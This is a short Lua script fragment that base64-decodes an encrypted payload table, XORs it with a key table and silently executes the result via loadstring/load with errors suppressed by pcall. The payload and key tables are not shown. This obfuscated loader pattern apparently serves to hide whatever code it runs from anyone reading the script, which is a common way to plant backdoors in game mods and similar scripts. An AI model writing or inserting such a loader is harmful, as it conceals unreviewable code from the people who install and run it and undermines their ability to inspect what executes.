local B='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function bx(a,b)
    local r,bit=0,1
    while a>0 or b>0 do
        local x,y=a%2,b%2
        if x~=y then r=r+bit end
        a=(a-x)/2 b=(b-y)/2 bit=bit*2
    end
    return r
end
local function b64d(s)
    local out={} local acc=0 local bits=0
    for i=1,#s do
        local c=s:sub(i,i)
        local v=B:find(c,1,true)
        if v then
            acc=acc*64+(v-1) bits=bits+6
            if bits>=8 then
                bits=bits-8
                local div=2^bits
                local byte=math.floor(acc/div)%256
                out[#out+1]=string.char(byte)
                acc=acc%div
            end
        end
    end
    return table.concat(out)
end
local enc=table.concat(P)
local dec=b64d(enc)
local out={} local n=#K
for i=1,#dec do
    out[i]=string.char(bx(string.byte(dec,i),K[(i-1)%n+1]))
end
local code=table.concat(out)
local fn=loadstring or load
if fn then
    local f=fn(code,"=fallen")
    if f then
        pcall(f)
    end
end
